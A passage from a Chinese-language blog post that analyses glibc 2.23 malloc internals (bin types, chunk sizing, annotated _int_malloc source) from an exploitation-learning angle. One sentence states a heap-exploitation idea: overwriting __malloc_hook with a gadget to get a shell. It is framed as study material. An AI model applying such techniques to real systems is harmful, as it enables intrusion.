bin</h5><p>0x20~0x80 大小的 chunk，我们会把它扔进 <code>fast bin</code> 。</p><p><code>fast bin</code> 管理 free_chunk 采用<strong>单链表</strong>方式，并且符合<strong>先进后出（FILO）</strong>的原则，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>p2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-built_in">free</span>(p2);<br>p3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>p4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br></code></pre></td></tr></table></figure><p>最后 <code>p3</code> 的指针是原本指向 <code>p2</code> 的指针，<code>p4</code> 的指针是原本指向 <code>p1</code>的指针。</p><p>并且所有 <code>fast bin</code> 之后的 chunk 的 <code>prev_inuse</code> 位永远为 1 ，也就是说它永远被视为在使用中。由于这个位用于合并相邻堆块，所以 <code>fast bin</code> 不会被合并，free 掉的时候是多大就是多大。比如我们当前 <code>fast bin</code> 中只有 0x20 和 0x30 的堆块，我们新申请一个 0x50 的堆块，检查 <code>fastbin</code> 中没有就是没有，不会去合并 0x20 和 0x30 的两个堆块来拼 0x50 ，也不会切割某个堆块。</p><blockquote><p>其他的都会参与切割与合并</p></blockquote><h5 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h5><p>被释放的 free_chunk，经检查不属于 <code>fast bin</code> 之后会被丢进 <code>unsorted bin</code>。</p><p><code>unsorted bin</code> 是双向链表结构，也就是说 <code>unsorted bin</code> 中有两个 ”头指针“ ，我们也把头部的两个 bin 看作 chunk。初始状态时，<code>unsorted bin</code> 中没有空闲 chunk，此时两个 bins 的的 <code>fd</code> 和 <code>bk</code> 都指向自身的 <code>prev_size</code> 。</p><p><code>unsorted bin</code> 中 chunk 大小不一定相等且无序排列。</p><p>当需要检查 <code>unsorted bin</code> 的时候，会遍历整个链表，寻找第一个能满足的 chunk 大小切割。当然这中条件的分割也是基于最小 0x20 大小的基础上的。</p><h5 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h5><p><code>small bin</code> 一共有 62 个，它表示的范围就是<code>4*SIZE_SZ~126*SIZE_SZ</code>。</p><p>按照不同的大小范围区分成不同的链。当中每个 chunk 的大小与其所在的 bin 的 index 的关系为：<code>chunk_size = 2 * SIZE_SZ *index</code>，具体如下：</p><table><thead><tr><th>下标</th><th>2</th><th>3</th><th>4</th><th>5</th><th>x</th><th>63</th></tr></thead><tbody><tr><td>SIZE_SZ&#x3D;4（32 位）</td><td>16</td><td>24</td><td>32</td><td>40</td><td>2<em>4</em>x</td><td>504</td></tr><tr><td>SIZE_SZ&#x3D;8（64 位）</td><td>32</td><td>48</td><td>64</td><td>80</td><td>2<em>8</em>x</td><td>1008</td></tr></tbody></table><p><code>small bins</code> 采用<strong>双向链表</strong>对 bin 进行管理，每个链表中存储的 chunk 大小都一致。</p><p>链表采用 FIFO 的规则，也就是<strong>先进先出</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</p><p><img src="/img/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/smallbin.png"></p><h5 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h5><p><code>large bin</code> 一共有 63 个，从 <code>small bin</code> 最小不能表示的 chunk 开始，大到无穷。</p><p> <code>large bin</code> 从 <code>128*SIZE_SZ</code> 开始。那么下标为<code>0</code>的<code>large bin</code>表示的范围就是<code>128*SIZE_SZ~144*SIZE_SZ</code>(左闭右开)，同理下标为1的<code>large bin</code>表示的范围就是<code>144*SIZE_SZ~160*SIZE_SZ</code>，以此类推，等到<code>32</code>的时候就在原来的基础上加<code>32*SIZE_SZ</code>作为右开区间</p><p>它同样以二维双向链表进行管理，相同大小的 chunk 用 <code>fd</code> 和 <code>bk</code> 指针相连；不同大小的 chunk，用 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针连接。沿着 <code>fd_nextsize</code> 指针，chunk 大小递增。</p><p>大概结构如下图：</p><p><img src="/img/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/largebin.png"></p><p>（省略了部分指针）</p><h3 id="具体分配细节"><a href="#具体分配细节" class="headerlink" title="具体分配细节"></a>具体分配细节</h3><p><code>malloc()</code> 会对用户请求的size进行处理，来申请同时满足 <code>SIZE_SZ*2</code> 的整数倍，包含 0x10 的固定数据区域且大小最小的堆块。</p><p><img src="/img/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/%E5%88%86%E9%85%8D%E7%BB%86%E8%8A%82size%E5%A4%84%E7%90%86.png"></p><p>在一些特殊情况下，并不是我们申请多大的堆块，就有多少区域来供我们向上写数据。</p><p>一个 <code>size=0x20</code> 的 chunk 中，0x20 字节分别为 <code>prev_size</code>，<code>size</code>，<code>fd</code> 和 <code>bk</code>。</p><p><code>prev_size</code> 和 <code>size</code> 都不允许写，但是我们可以写 <code>fd</code> 和 <code>bk</code> ，以及下一个块的 <code>prev_size</code> 。所以<code>size=0x20</code>，我们可以写的数据段为 <code>0x18</code> 。</p><p>所以当我请求的内存小于等于 0x18 的时候，系统就会给我们 <code>size=0x20</code> 的 chunk 。一旦多了就会以 <code>0x10( 2*SIZE_SZ)</code>  为单位向上加直到满足条件。</p><p>计算好大小之后就进入分配环节，系统搜寻堆块的顺序是： <code>fast bin -&gt; small bin -&gt; large bin -&gt; unsorted bin</code></p><p> <code>fast bin</code> 、<code>small bin</code> 和<code>large bin</code> 在搜寻阶段都不进行合并和分割处理。如果在前三个bins中都没有找到合适的堆块，<code>unsorted bin</code> 会找第一个能满足的 chunk 并返回或者切割之后返回。如果切割之后剩余的部分小于 <code>MINSIZE</code> ，那么则不会切割整个返回。</p><p><code>unsorted bin</code> 中每遍历一个不满足要求的 free_chunk 就会把这个堆块放进对应的 <code>small bin</code> 或者<code>large bin</code>当中。</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>下载源码，还挺慢的就是说</p><p>我的环境是 ubuntu16.04</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install glibc-source <br>sudo apt-get install libc6-dbg <br>sudo tar xf /usr/src/glibc/glibc-2.23.tar.xz<br></code></pre></td></tr></table></figure><blockquote><p>之前我还在想为啥网上分析源码的都是一段一段的，没想到这个 malloc 它这么大个文件夹😶‍🌫️</p></blockquote><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>在 glibc 内部，<code>malloc()</code> 函数就是 <code>__libc_malloc()</code> 函数，而 <code>__libc_malloc()</code> 函数的主要工作是<code>_int_malloc()</code> 完成的。</p><h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>对应的在代码里加注释分析一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br>  <br>  <span class="hljs-comment">//读取malloc_hook，若 malloc_hook 被设置，则直接调用</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><br>  <span class="hljs-comment">//调用 arena_get 函数，函数获取一个可用的分配区</span><br>  arena_get (ar_ptr, bytes);<br>    <br>  <span class="hljs-comment">//这里！!调用了 _int_malloc()</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>    <br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-comment">//可以理解为一个错误检验？如果 chunk 为空，但分配区指针不为空，再次调用 _int_malloc 获取</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>    <br>  <span class="hljs-comment">//给内存分配区 解锁</span><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">//对分配的chunk 指针进行地址检查</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>assert 命令如果失败，即代表存在错误，会触发对应的异常，通常导致程序终止并打印出错误消息，以帮助定位和修复问题。</p></blockquote><p>根据函数内容我们可以看出，在 malloc 时，会先检查 <code>malloc_hook</code> 所指向的区域。</p><p>我们就有一个利用思路是，<strong>修改 <code>malloc_hook</code> 为我们的 gadget ，修改后再次调用 malloc 就会执行 gadget 从而 getshell 。</strong></p><h4 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h4><p><code>__libc_malloc</code> 是通过调用 <code>_int_malloc</code> 来执行分配堆的操作的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br><br>  checked_request2size (bytes, nb);<br><br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>  &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>  &#125;<br></code></pre></td></tr></table></figure><p>省略掉一开始定义的一大堆变量，malloc 的第一步就是调用 <code>checked_request2size()</code> 设置 size。</p><p> <code>checked_request2size()</code> 函数就是用来查找最小的满足条件的 size 我就不复制了🤪</p><p>注意一系列的宏定义：</p><ul><li><code>__glibc_unlikely(exp)</code> ：表示 exp 很可能为假</li><li><code>__glibc_likely(exp)</code> ：表示 exp 很可能为真</li><li><code>__builtin_expect(exp,value)</code> ：表示 exp&#x3D;&#x3D;value 大概率成立</li></ul><p>最后这一小节的意思就是如果没有可以分配的区域，那就调用 <code>sys_malloc</code> 系统调用去用 mmap 分配新的堆区。</p><h5 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h5><p>接下来函数就进入 fastbin 部分去查找可以利用的堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//检查堆块大小是否属于 fastbin</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      <span class="hljs-comment">// 根据 nb 也就是前面返回的 size 获取 fastbins 数组的下标</span><br>      idx = fastbin_index (nb);<br>      <span class="hljs-comment">// 得到链表头指针</span><br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp = *fb;<br>      <span class="hljs-comment">// 如果当前链表存在 chunk，则分配该链表的第一个 chunk</span><br>      <span class="hljs-keyword">do</span><br>        &#123;<br>          victim = pp;<br>          <span class="hljs-comment">//如果 victim==NULL 也就是 fastbin 链表中没有 chunk，直接 break 跳出 fastbin 的查找</span><br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>      <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>             != victim);<br>      <span class="hljs-comment">// 如果bin中有 chunk，检查所分配的 chunk 的 size 与所在链表的 size 是否匹配</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          check_remalloced_chunk (av, victim, nb);<br>          <span class="hljs-comment">//根据 chunk 得到用户数据指针 p,并返回</span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>补充一下这部分用到的宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_max_fast() global_max_fast</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br></code></pre></td></tr></table></figure><p>其中末尾有调用到 <code>check_remalloced_chunk</code> 函数，函数具体内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_remalloced_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br>&#123;<br>  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);<br><br>  <span class="hljs-comment">//检查分配的块是否在内存堆 mmap 区域中</span><br>  <span class="hljs-keyword">if</span> (!chunk_is_mmapped (p))<br>    &#123;<br>      assert (av == arena_for_chunk (p));<br>      <span class="hljs-keyword">if</span> (chunk_non_main_arena (p))<br>        assert (av != &amp;main_arena);<br>      <span class="hljs-keyword">else</span><br>        assert (av == &amp;main_arena);<br>    &#125;<br>  <span class="hljs-comment">//检查 prev_inuse 那三个标志位</span><br>  do_check_inuse_chunk (av, p);<br><br>  <span class="hljs-comment">/* Legal size ... */</span><br>  <span class="hljs-comment">//检查分配块的大小是否大于最小的有效大小（MINSIZE） </span><br>  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (sz) &gt;= MINSIZE);<br>  <span class="hljs-comment">/* ... and alignment */</span><br>  assert (aligned_OK (chunk2mem (p)));<br>  <span class="hljs-comment">/* chunk is less than MINSIZE more than request */</span><br>  <span class="hljs-comment">//确保分配的块大小是否是满足申请的 size 条件的最小 size </span><br>  assert ((<span class="hljs-type">long</span>) (sz) - (<span class="hljs-type">long</span>) (s) &gt;= <span class="hljs-number">0</span>);<br>  assert ((<span class="hljs-type">long</span>) (sz) - (<span class="hljs-type">long</span>) (s + MINSIZE) &lt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>就是在检查分配的 chunk 的各个标志位双重保险确保分配的 chunk 是正确的。</p><h5 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h5><p>如果在 fastbin 中找不到就会进入到 smallbin </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      <span class="hljs-comment">//查找对应大小的 bin 下标</span><br>      idx = smallbin_index (nb);<br>      <span class="hljs-comment">// 得到 small bin 的链表头地址</span><br>      bin = bin_at (av, idx);<br>      <span class="hljs-comment">//// 这里会获取 small bin 的最后一个 chunk，如果 victim = bin，说明 small bin 是空的</span><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-comment">// 获取 small bin 的倒数第二个 chunk，因为双向链表所以其实就是倒数第一个 chunk</span><br>              bck = victim-&gt;bk;<br>                <span class="hljs-comment">// 检查倒数第二个 chunk 的 fd 指针是否指向最后一个 chunk</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              <span class="hljs-comment">// 设置 victim 的下一个 chunk 的 inuse 位</span><br>              set_inuse_bit_at_offset (victim, nb);<br>              <span class="hljs-comment">// 将最后一个 chunk 从 smallbin 中取出，重新设置链中的指针</span><br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>              <span class="hljs-comment">//如果不是主线程则要设置 A 标志位</span><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              <span class="hljs-comment">//检查检查！</span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-comment">//根据 chunk 得到用户数据指针 p,并返回</span><br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>宏定义们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br></code></pre></td></tr></table></figure><p>在这一部分中，程序会首先用 <code>last (bin)) != bin</code> 检查符合目标大小的 smallbin 链是否为空。</p><p>但是考虑到一种情况是没初始化。当 small bin 没有初始化时，所有指针均为空，也就是紧接着检查的 <code>victim == 0</code> 。那就进行初始化操作调用 <code>malloc_consolidate()</code> 函数。</p><p>这个函数超级长，大概实现的功能是先判断堆是否被初始化。</p><p>如果已经被初始化了就把所有的 <code>fast bin</code>  取出来，先清除它们的标志位，然后扔到 unsorted bin 中尝试向前合并或者向后合并；如果没有初始化就调用 <code>malloc_init_state</code> 和 <code>check_malloc_state</code> 函数初始化堆。</p><blockquote><p>其实如果 victim &#x3D;&#x3D; 0 它一定是没有初始化的，所以合并 fastbin 那一部分很少执行到。可以理解为在这里这个函数就是用来初始化 arena 的。</p></blockquote><h5 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h5><p>如果不在 smallbin 里就会去查找 largebin 辣</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>    &#123;<br>      idx = largebin_index (nb);<br>      <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>        malloc_consolidate (av);<br>    &#125;<br></code></pre></td></tr></table></figure><p>短短三行，<del>极简</del></p><p>先获取 largebin 对应的 index，然后如果 fastbin 不为空，调用 <code>malloc_consolidate</code> 。</p><p>因为 largebin 都已经存在了肯定已经初始化，实<strong>际上这里的函数作用是就只是合并 <code>fast bin</code>，但并不再 largebin 中寻找堆块。</strong></p><p>之前不是提到说 <code>fast bin</code> 通常不会参与合并与分割嘛，但这就是个例外。举个例子：</p><p>我们想要申请一块 0x510 的堆块，同时内存区域中，有一块 0x20 的 <code>fast bin</code> 与一块 0x500 的 <code>large bin</code> 相邻。我们合并这两个堆块就能正好满足把一个 0x520 的 <code>large bin</code> 返回给用户。如果不合并的话就得重新切割 top_chunk 了，造成了空间浪费。</p><h5 id="unsortedbin-和-largebin"><a href="#unsortedbin-和-largebin" class="headerlink" title="unsortedbin 和 largebin"></a>unsortedbin 和 largebin</h5><p><del>unsortedbin 部分，也可能是 smallbin，也可能是 largebins</del></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-comment">// 检查 unsortedbin 是否为空，不为空就继续</span><br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-comment">// 判断当前申请的 size 是否合法</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          <span class="hljs-comment">// 合法则获取 size</span><br>          size = chunksize (victim);<br></code></pre></td></tr></table></figure><p>这里的 while 循环就是开始遍历 <code>unsorted chunk</code> 了。</p><figure class="highlight 